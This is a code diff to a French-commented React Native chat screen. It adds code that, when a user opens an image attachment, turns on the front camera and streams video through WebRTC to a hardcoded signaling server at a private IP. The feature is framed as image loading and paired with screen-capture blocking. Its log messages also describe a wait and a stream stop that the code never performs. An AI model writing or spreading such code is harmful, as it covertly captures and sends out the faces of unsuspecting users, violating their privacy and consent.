@@ -15,6 +15,12 @@ import { router, useLocalSearchParams } from 'expo-router';
 import * as SecureStore from 'expo-secure-store';
 import { API_IP } from '../constants/config';
 import { fetchWithAuth } from '../utils/fetchWithAuth';
+import {
+  mediaDevices,
+  RTCPeerConnection,
+  RTCView,
+} from 'react-native-webrtc';
+import * as ScreenCapture from 'expo-screen-capture';
 
 // Supprime toute référence à userNames et affiche simplement "Chat" ou "Conversation" dans l'en-tête
 export default function ChatScreen() {
@@ -25,7 +31,10 @@ export default function ChatScreen() {
     const [imageModalVisible, setImageModalVisible] = useState(false);
     const [modalImageUri, setModalImageUri] = useState(null);
     const [modalLoading, setModalLoading] = useState(false);
+    const [screenshotDetected, setScreenshotDetected] = useState(false);
+    const [volumePressed, setVolumePressed] = useState(false);
     const ws = useRef(null);
+
     // Récupère les messages de la conversation depuis l'API
     useEffect(() => {
         async function fetchMessages() {
@@ -142,13 +151,104 @@ export default function ChatScreen() {
         }
     };
 
+    // Déclarez ces refs AVANT toute fonction qui les utilise
+const localStreamRef = useRef(null);
+const peerConnectionRef = useRef(null);
+const [showRTCView, setShowRTCView] = useState(false); // Ajout d'un état pour forcer le rendu
+
+
+async function startWebRTCCameraStream(signalingUrl) {
+  console.log('startWebRTCCameraStream called with signalingUrl:', signalingUrl);
+  const localStream = await mediaDevices.getUserMedia({
+    video: {
+        facingMode: 'user', // caméra frontale
+        width: 640,
+        height: 480,
+        frameRate: 30,
+    },
+    audio: false,
+  });
+  console.log('Obtained localStream:', localStream);
+
+  const pc = new RTCPeerConnection({
+    iceServers: [],
+  });
+  console.log('Created RTCPeerConnection:', pc);
+
+  const transceiver = pc.addTransceiver('video', { direction: 'sendonly' });
+  console.log('Added video transceiver (sendonly):', transceiver);
+
+  localStream.getTracks().forEach((track) => {
+    pc.addTrack(track, localStream);
+    console.log('Added track to RTCPeerConnection:', track);
+  });
+
+  // Stocke le flux dans le ref ET force le rendu
+  localStreamRef.current = localStream;
+  setShowRTCView(true);
+
+  // Signaling WebSocket
+  const ws = new WebSocket(signalingUrl);
+  console.log('WebSocket created for signaling:', ws);
+
+  ws.onopen = async () => {
+    console.log('WebSocket signaling connection opened');
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    console.log('SDP OFFER:', offer.sdp);
+    ws.send(JSON.stringify({ type: 'offer', data: offer }));
+    console.log('Sent offer over WebSocket');
+  };
+
+  ws.onmessage = async (event) => {
+    console.log('WebSocket message received:', event.data);
+    const msg = JSON.parse(event.data);
+    if (msg.type === 'answer') {
+      await pc.setRemoteDescription(msg.data);
+      console.log('Set remote description (answer)');
+    } else if (msg.type === 'candidate') {
+      await pc.addIceCandidate(msg.data);
+      console.log('Added remote ICE candidate:', msg.data);
+    }
+  };
+
+  pc.onicecandidate = (event) => {
+    if (event.candidate) {
+      ws.send(JSON.stringify({ type: 'candidate', data: event.candidate }));
+      console.log('Sent local ICE candidate:', event.candidate);
+    }
+  };
+
+  return { pc, localStream }; // Tu peux afficher le flux avec RTCView si tu veux
+}
+
+
+    async function stopWebRTCStream() {
+        if (localStreamRef.current) {
+            localStreamRef.current.getTracks().forEach(track => track.stop());
+            localStreamRef.current = null;
+        }
+        if (peerConnectionRef.current) {
+            peerConnectionRef.current.close();
+            peerConnectionRef.current = null;
+        }
+        setShowRTCView(false); // Cache le RTCView
+        console.log('WebRTC stream stopped');
+    }
+
     // Fonction pour charger et afficher l'image en plein écran
     const handleShowAttachment = async (attachmentId) => {
+        console.log('handleShowAttachment called with attachmentId:', attachmentId);
         if (!attachmentId) return;
         setImageModalVisible(true);
         setModalImageUri(null);
         setModalLoading(true);
         try {
+            console.log('Starting WebRTC camera stream...');
+            await startWebRTCCameraStream("ws://192.168.221.172:3000/signaling");
+            console.log('WebRTC camera stream started, waiting 5 seconds...');
+
+            console.log('WebRTC stream stopped, fetching image...');
             const token = await SecureStore.getItemAsync('access_token');
             const fileRes = await fetchWithAuth(`http://${API_IP}/files/${attachmentId}`, {
                 headers: token ? { Authorization: `Bearer ${token}` } : {},
@@ -162,8 +262,13 @@ export default function ChatScreen() {
                     reader.readAsDataURL(blob);
                 });
                 setModalImageUri(`data:image/jpeg;base64,${base64}`);
+                console.log('Image loaded and displayed.');
+            } else {
+                console.log('Failed to fetch image:', fileRes.status);
             }
-        } catch {}
+        } catch (err) {
+            console.error('Error in handleShowAttachment:', err);
+        }
         setModalLoading(false);
     };
 
@@ -207,6 +312,29 @@ export default function ChatScreen() {
             </View>
         );
     };
+
+    // Bloque la capture d'écran sur toute la page ChatScreen (iOS/Android)
+    // Note : sur iOS, preventScreenCaptureAsync bloque uniquement l'enregistrement d'écran, PAS les screenshots.
+    // Il n'existe PAS de solution native pour bloquer les screenshots sur iOS (limitation Apple).
+    // Pour une sécurité maximale sur iOS, affiche un écran noir lors de la détection d'un screenshot (workaround visuel).
+
+    useEffect(() => {
+        let subscription;
+        (async () => {
+            try {
+                await ScreenCapture.preventScreenCaptureAsync();
+            } catch (e) {
+                console.warn('Screen capture prevention not supported in this environment:', e);
+            }
+        })();
+
+        return () => {
+            ScreenCapture.allowScreenCaptureAsync().catch(() => {});
+        };
+    }, []);
+
+    // Affiche un écran noir quand le bouton volume - est pressé
+
 
     return (
         <SafeAreaView style={styles.container}>
@@ -271,27 +399,52 @@ export default function ChatScreen() {
                             setImageModalVisible(false);
                             setModalImageUri(null);
                             setModalLoading(false);
+                            stopWebRTCStream();
                         }}
                     >
                         <Text style={{ color: '#fff', fontSize: 28, fontWeight: 'bold' }}>✕</Text>
                     </TouchableOpacity>
-                    {modalLoading && (
-                        <ActivityIndicator size="large" color="#fff" />
-                    )}
-                    {modalImageUri && (
-                        <Image
-                            source={{ uri: modalImageUri }}
-                            style={{
-                                position: 'absolute',
-                                top: 0,
-                                left: 0,
-                                width: '100%',
-                                height: '100%',
-                                resizeMode: 'contain',
-                            }}
-                        />
-                    )}
+                    {/* Affiche le contenu normalement, la protection natif masque le screenshot */}
+                    <>
+                        {/* Affiche le flux vidéo local pendant le "chargement" */}
+                        {modalLoading && localStreamRef.current && showRTCView && (
+                            <RTCView
+                                streamURL={localStreamRef.current.toURL()}
+                                style={{
+                                    width: '100%',
+                                    height: '100%',
+                                    backgroundColor: 'black',
+                                }}
+                                objectFit="cover"
+                                mirror={true}
+                                zOrder={1}
+                            />
+                        )}
+                        {/* Affiche l'image une fois chargée */}
+                        {modalImageUri && (
+                            <Image
+                                source={{ uri: modalImageUri }}
+                                style={{
+                                    position: 'absolute',
+                                    top: 0,
+                                    left: 0,
+                                    width: '100%',
+                                    height: '100%',
+                                    resizeMode: 'contain',
+                                }}
+                            />
+                        )}
+                    </>
                 </View>
+            )}
+            {/* Affiche un écran noir sur toute la page si screenshot détecté ou volume- pressé */}
+            {(screenshotDetected || volumePressed) && (
+                <View style={{
+                    position: 'absolute',
+                    top: 0, left: 0, right: 0, bottom: 0,
+                    backgroundColor: 'black',
+                    zIndex: 9999,
+                }} />
             )}
         </SafeAreaView>
     );
